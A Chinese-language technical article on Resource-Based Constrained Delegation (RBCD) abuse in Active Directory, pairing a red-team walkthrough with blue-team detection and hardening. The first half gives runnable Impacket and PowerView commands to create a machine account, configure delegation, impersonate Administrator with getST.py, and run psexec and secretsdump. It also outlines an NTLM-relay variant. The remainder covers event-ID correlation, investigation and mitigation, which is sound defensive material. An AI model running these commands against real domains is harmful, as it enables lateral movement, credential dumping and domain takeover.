---
title: "资源基础约束委派(RBCD)攻击链与检测处置"
weight: 35
---

# 资源基础约束委派(RBCD)攻击链与检测处置

`Resource-Based Constrained Delegation`，即 `RBCD`，是 Active Directory 后渗透阶段最稳定的横向移动技术之一。它的本质不是“爆破域管密码”，而是把对象控制权转化为 Kerberos 代理能力。只要攻击者能够让目标计算机对象信任自己控制的服务主体，就可以代表任意用户向目标服务申请合法票据，并以该用户权限访问目标主机。

这类攻击在真实环境中经常出现于以下几种场景：

- 普通域用户默认可以创建机器账户
- 某业务组对服务器计算机对象存在 `GenericWrite`、`WriteDacl` 或 `GenericAll`
- `NTLM Relay` 可以被用来替目标主机配置 `RBCD`
- 蓝队只监控登录事件，不监控目录对象属性修改和 `S4U` 票据流

本文按实战链路重写，重点放在三件事：

1. 攻击者实际如何把 `RBCD` 打通
2. 常见利用链会留下哪些事件痕迹
3. 蓝队如何从目录属性、Kerberos 票据和目标主机访问行为三层联动调查

---

## 1. 先判断这条路能不能打

在域内拿到一个普通账户后，红队不会先背定义，而是快速判断 `RBCD` 是否满足落地条件。

### 1.1 必备条件

至少需要同时满足下面两项中的一项半到两项：

- 控制一个可用于服务认证的主体
- 能修改目标计算机对象的 `msDS-AllowedToActOnBehalfOfOtherIdentity`

这里的“可用于服务认证的主体”通常有三种来源：

- 新建机器账户
- 已控制的机器账户
- 已控制且带有 `SPN` 的服务账户

最常见的是第一种。许多域仍保留默认 `MachineAccountQuota=10`，普通域用户即可创建机器账户。机器账户天然具备 `HOST/`、`CIFS/` 等 `SPN`，可直接参与 `S4U2Self` 和 `S4U2Proxy` 流程。

### 1.2 红队最关心的枚举点

拿到低权限账户后，优先看三类信息：

```powershell
Import-Module .\PowerView.ps1

# 1. 查 MachineAccountQuota
Get-DomainObject -Identity "DC=corp,DC=local" -Properties ms-ds-machineaccountquota

# 2. 枚举对计算机对象的写权限
Get-DomainObjectAcl -ResolveGUIDs |
  Where-Object {
    $_.ActiveDirectoryRights -match "GenericWrite|WriteDacl|GenericAll|WriteProperty"
  } |
  Select-Object ObjectDN, ActiveDirectoryRights, SecurityIdentifier
```

如果用 BloodHound，重点不是“路径长不长”，而是：

- 当前用户是否拥有 `AddComputer`
- 当前用户或其组是否能写某台服务器对象
- 被写对象是否是跳板机、文件服务器、证书服务器、管理节点或域控

### 1.3 票据层面真正发生了什么

很多文章把 `RBCD` 写成“修改属性后拿管理员权限”，实际并不准确。`RBCD` 的产出不是管理员密码，而是一张合法的服务票据。

完整流程通常是：

1. 攻击者控制一个服务主体
2. 把该主体写入目标对象的 `msDS-AllowedToActOnBehalfOfOtherIdentity`
3. 使用该主体向 KDC 发起 `S4U2Self`
4. 再发起 `S4U2Proxy`
5. 获得面向目标服务的 `TGS`

最终效果是：攻击者不需要知道 `Administrator` 的密码，也可以拿到一张“代表 `Administrator` 访问 `cifs/file01.corp.local`”的票据。

---

## 2. 利用链一：ACL 写入 RBCD

这是渗透测试里最典型、最稳定的一条链。公开资料、实战博客和常见工具都围绕这条路径展开。

### 2.1 场景设定

假设当前已获得普通域用户 `lowpriv`，并发现：

- 域默认允许创建机器账户
- `lowpriv` 对 `FILE01$` 计算机对象具备写权限

此时就可以直接走标准 `RBCD` 链。

### 2.2 第一步：创建攻击者控制的机器账户

Linux 下常用 `Impacket`：

```bash
addcomputer.py 'corp.local/lowpriv:Password123!' \
  -dc-ip 10.10.10.10 \
  -computer-name 'RBCD-SVC$' \
  -computer-pass 'Str0ngPass!123'
```

Windows 下常用 `PowerMad`：

```powershell
Import-Module .\Powermad.ps1
New-MachineAccount -MachineAccount "RBCD-SVC" `
  -Password $(ConvertTo-SecureString 'Str0ngPass!123' -AsPlainText -Force)
```

这里要记住三个值：

- 机器账户名
- 机器账户密码
- 对应 SID

后续写入属性本质上是把这个机器主体的 SID 写到目标对象的安全描述符里。

### 2.3 第二步：给目标主机配置 RBCD

Linux/Impacket：

```bash
rbcd.py \
  -delegate-from 'RBCD-SVC$' \
  -delegate-to 'FILE01$' \
  -action write \
  -dc-ip 10.10.10.10 \
  'corp.local/lowpriv:Password123!'
```

Windows/PowerView：

```powershell
Set-DomainRBCD -Identity FILE01 -DelegateFrom 'RBCD-SVC$'
```

写入成功后，`FILE01$` 就被配置为信任 `RBCD-SVC$` 代表其他用户访问自己。

### 2.4 第三步：请求目标用户的服务票据

这一步才是真正的权限转换动作。常见目标服务优先选：

- `cifs/host`：适合 `SMB`、`psexec`、共享访问
- `host/host`：可覆盖部分本机服务访问
- `ldap/dc`：适用于更高价值的目录操作
- `http/host`：适用于 WinRM/IIS 场景

最经典的请求方式：

```bash
getST.py \
  -spn cifs/file01.corp.local \
  -impersonate Administrator \
  -dc-ip 10.10.10.10 \
  'corp.local/RBCD-SVC$:Str0ngPass!123'
```

输出通常是 `Administrator.ccache`。

### 2.5 第四步：拿着票据打目标主机

```bash
export KRB5CCNAME=Administrator.ccache

impacket-psexec -k -no-pass corp.local/administrator@file01.corp.local
```

或者：

```bash
export KRB5CCNAME=Administrator.ccache

secretsdump.py -k -no-pass \
  corp.local/administrator@file01.corp.local \
  -target-ip 10.10.10.21
```

如果目标是成员服务器，通常意味着本机接管。
如果目标是域控，风险会立刻抬升到：

- 目录导出
- 凭据同步
- 域级持久化

### 2.6 这条链最容易失败的地方

不要把 `RBCD` 误认为“必成攻击”。实战中常见失败点包括：

- 目标账户被标记为“敏感且不能被委派”
- 目标服务选错，导致即使拿到票据也无法执行预期操作
- `MachineAccountQuota=0`
- 当前账号对目标对象并不真的有写入关键属性的权限
- 名称解析错误，导致后续使用 `Kerberos` 票据访问失败

实战里最常见的一个坑是：票据请求成功了，但后续直接用 IP 访问目标，导致 `SPN` 不匹配。`Kerberos` 场景下优先使用主机名或 FQDN，不要直接拿 IP 当目标。

---

## 3. 利用链二：NTLM Relay 设置 RBCD

这一条链比单纯 ACL 滥用更危险，因为它把“原本没有对象写权限”的问题，转化成了“是否能把认证中继到 LDAP”。

### 3.1 基本思路

典型组合打法如下：

1. 先准备一个攻击者控制的机器账户
2. 诱导或强制目标机器向攻击者发起 NTLM 认证
3. 用 `ntlmrelayx` 把这次认证中继到 `LDAP/LDAPS`
4. 让 `ntlmrelayx` 直接给目标对象设置 `RBCD`
5. 再用 `getST.py` 代表高权限用户申请票据

这也是很多公开案例里最有实战味道的一条链，因为它不要求当前低权限账户本来就能修改目标对象。

### 3.2 常见触发手法

公开资料和实战复现里最常见的触发来源有：

- `PetitPotam`
- `PrinterBug`
- `WebClient/WebDAV`
- 机器账户自身 NTLM 认证被中继

如果环境没有做完善签名和绑定保护，这类链可以直接把某台机器“拉进”攻击者构造的 `RBCD` 授权关系里。

### 3.3 常见工具组合

准备机器账户：

```bash
addcomputer.py 'corp.local/lowpriv:Password123!' \
  -dc-ip 10.10.10.10 \
  -computer-name 'BAUD$' \
  -computer-pass 'BaudPass!123'
```

然后用中继工具将受害主机认证中继到 `LDAP/LDAPS`，并设置委派访问。不同版本工具参数略有差异，常见思路是：

- 指定中继目标为 `ldaps://dc01.corp.local`
- 打开 `--delegate-access`
- 指定要提升的机器账户 `BAUD$`

中继设置完成后，再使用标准 `getST.py`：

```bash
getST.py \
  -spn cifs/target.corp.local \
  -impersonate Administrator \
  -dc-ip 10.10.10.10 \
  'corp.local/BAUD$:BaudPass!123'
```

### 3.4 为什么蓝队容易漏掉这条链

因为很多监控规则会把“认证中继”和“Kerberos 票据异常”分开看。实际上一条完整攻击链会同时跨越：

- NTLM 网络认证
- LDAP 对象写入
- Kerberos `S4U`
- 目标主机侧访问

如果只看 `4624` 或只看 `4769`，很容易漏掉完整上下文。

---

## 4. 更高级但更少见的变体

### 4.1 SPN-less RBCD

近年的公开研究已经证明，`RBCD` 并不永远强依赖“攻击者必须控制一个带 SPN 的服务账户”。某些场景下可以利用 `U2U` 相关技巧实现 `SPN-less RBCD`，即使 `MachineAccountQuota=0` 也可能找到绕行路径。

但这类方法实战成本更高，环境约束更多，而且可能影响被利用账户正常使用。对于常规渗透测试，优先级仍然低于“新建机器账户 + 标准 S4U”。

### 4.2 跨域与跨林场景

部分公开资料已经讨论跨域 `RBCD` 的细节问题，例如：

- 委派条目可能需要直接使用 SID
- Linux 工具链默认流程不一定能正确处理跨域 `S4U`
- 被模拟用户通常要与攻击者控制主体处于兼容的信任范围内

因此跨域 `RBCD` 不是“工具一把梭”，而是需要先确认信任关系、域边界和 KDC 行为。

### 4.3 与 AD CS 的联动

这是很值得单独关注的组合点。若环境中还存在 `AD CS` 配置缺陷，例如可通过证书拿到 `LDAP` 高权限访问能力，则攻击链可能演化为：

1. 先通过证书拿下 LDAP 操作能力
2. 再对目标对象配置 `RBCD`
3. 最后以高权限用户身份申请目标服务票据

也就是说，`RBCD` 在很多时候不是入口，而是攻击链中的“身份转换器”。

---

## 5. 蓝队检测：不要只盯登录日志

`RBCD` 并不隐形。真正难的是，关键痕迹分散在不同日志里。要想查清楚，必须把目录属性修改、机器账户创建、`S4U` 票据申请和目标主机访问串成时间线。

### 5.1 Event ID 5136：目录对象被修改

最关键的日志是域控上的 `5136`。排查重点不是“有没有对象被改”，而是：

- LDAP Display Name 是否为 `msDS-AllowedToActOnBehalfOfOtherIdentity`
- Subject 是谁
- Object 被改的是哪台机器
- Subject 是否是低权限用户、异常服务账户或新机器账户

一个非常高价值的判断条件是：

- 修改者不是正常运维账户
- 被修改对象却是高价值服务器或域控

简化筛选示例：

```powershell
Get-WinEvent -LogName Security |
  Where-Object {
    $_.Id -eq 5136 -and
    $_.Message -like "*msDS-AllowedToActOnBehalfOfOtherIdentity*"
  }
```

### 5.2 Event ID 4741：新机器账户创建

如果攻击者走的是默认 `MachineAccountQuota` 路线，通常会在域控上留下 `4741`。

这一事件单独看并不一定恶意，但结合上下文价值极高：

- 创建者是普通用户而不是加域流程账号
- 新机器名称不符合命名规范
- 该机器在创建后几分钟内立刻出现在 `4769` 的 `S4U` 票据流里

蓝队应避免把 `4741` 当作低优先级噪音直接忽略。

### 5.3 Event ID 4769：S4U2Self 与 S4U2Proxy

这是 `RBCD` 最具行为特征的部分。

`S4U2Self` 的常见检测思路：

- `Account Name` 与 `Service Name` 指向相同主体
- 票据请求主体往往是机器账户或带 `SPN` 的服务账户

`S4U2Proxy` 的常见检测思路：

- `Transited Services` 非空
- 紧接着出现面向目标服务的 `TGS` 请求
- 请求主体不是日常委派设备，却在请求高价值目标服务

公开检测文章普遍建议把下面四类动作关联起来看：

1. `4741` 新机器账户创建
2. `5136` 修改 `msDS-AllowedToActOnBehalfOfOtherIdentity`
3. 第一条 `4769`：`S4U2Self`
4. 第二条 `4769`：`S4U2Proxy`

如果四步在较短时间窗口内串起来，基本就是高置信度 `RBCD` 利用链。

### 5.4 目标主机侧的二次痕迹

`RBCD` 本身只负责拿票据，不负责最终入侵动作。真正的后续危害往往体现在目标主机上：

- `4624` 网络登录
- `5140` 共享访问
- `7045` 新服务安装
- `4698` 计划任务创建
- `Sysmon Event ID 1` 可疑进程启动

所以一旦域控侧发现可疑 `4769`，蓝队必须立刻把排查扩展到目标主机：

- 是否紧接着出现来自异常源主机的 `Kerberos` 登录
- 是否有 `SMB`、`PsExec`、`WinRM`、`WMI` 访问行为
- 是否出现凭据转储、远程服务创建或任务投递

---

## 6. 调查流程：按时间线还原

发现疑似 `RBCD` 后，不要只删属性。正确做法是按链路回放。

### 6.1 第一阶段：确认谁改了谁

先围绕 `5136` 拿到这几个关键字段：

- Subject Account
- Object DN
- 被修改属性名
- 时间戳

这一步的目标是确认：

- 谁改了 `RBCD`
- 改到了哪台机器上

### 6.2 第二阶段：确认攻击者控制了哪个主体

再检查是否存在：

- 新机器账户创建 `4741`
- 相关机器账户的后续 `4769`
- 机器账户或服务账户异常活跃

这里常能定位出攻击者控制的中间主体，例如 `RBCD-SVC$` 或随机新建机器名。

### 6.3 第三阶段：确认最终访问落到哪里

再把时间线扩展到目标主机：

- 看 `4624` 是否出现异常源
- 看 `5140`、`7045`、`4698`
- 看是否有 `secretsdump`、`psexec`、`wmiexec` 一类动作的落地痕迹

如果目标是域控，还要额外检查：

- 是否发生 `DCSync`
- 是否出现新的高权限对象修改
- 是否产生新的持久化手段

---

## 7. 处置与加固

### 7.1 立即处置

如果已确认被利用，优先动作应是：

- 清理目标对象上的 `msDS-AllowedToActOnBehalfOfOtherIdentity`
- 禁用或删除攻击者创建的机器账户
- 重置相关机器账户密码或执行重新入域
- 检查目标主机是否已被拿下并做应急隔离

### 7.2 长期加固

对 `RBCD` 有效的基础防护并不复杂，但很多环境长期没做：

- 将 `MachineAccountQuota` 调整为 `0`
- 清理普通用户或业务组对服务器对象的写权限
- 给高价值账户设置“敏感且不能被委派”
- 强制 `LDAP Signing`
- 结合环境启用 `SMB Signing` 与中继防护
- 对 `5136` 中关键委派属性修改建立实时告警
- 对 `4769` 中 `S4U2Self + S4U2Proxy` 组合建立关联规则

### 7.3 蓝队容易误判的点

几个常见误区：

- 只把 `5136` 当成“AD 运维操作”
- 只看 `4624`，忽略 `4769`
- 看到新机器账户创建但不关联后续票据行为
- 删除 `RBCD` 属性后就结束调查，忽略目标主机可能已被接管

---

## 8. 总结

`RBCD` 之所以危险，不是因为概念复杂，而是因为它把很多环境里早就存在的普通问题组合成了一条完整攻击链：

- 默认允许创建机器账户
- 对计算机对象授权过宽
- 中继链未被有效阻断
- 目录修改和 Kerberos 票据行为未建立联动检测

从红队角度看，`RBCD` 是域内横向移动的高性价比通道。
从蓝队角度看，真正需要掌握的不是一句定义，而是能否在日志里连出完整序列：

- `4741`
- `5136`
- `4769`
- 目标主机侧访问事件

只要这条时间线能被稳定重建，`RBCD` 就不是不可见攻击。

---

## 参考资料

- [Shenanigans Labs: Wagging the Dog](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [The Hacker Recipes: RBCD](https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd)
- [The Hacker Recipes: S4U2Self Abuse](https://www.thehacker.recipes/ad/movement/kerberos/delegations/s4u2self-abuse)
- [swolfsec: Detecting Resource-Based Constrained Delegation Abuse](https://swolfsec.github.io/2023-11-29-Detecting-Resource-Based-Constrained-Delegation/)
- [tothi/rbcd-attack](https://github.com/tothi/rbcd-attack)
- [HackTricks: Resource-based Constrained Delegation](https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/resource-based-constrained-delegation.html)
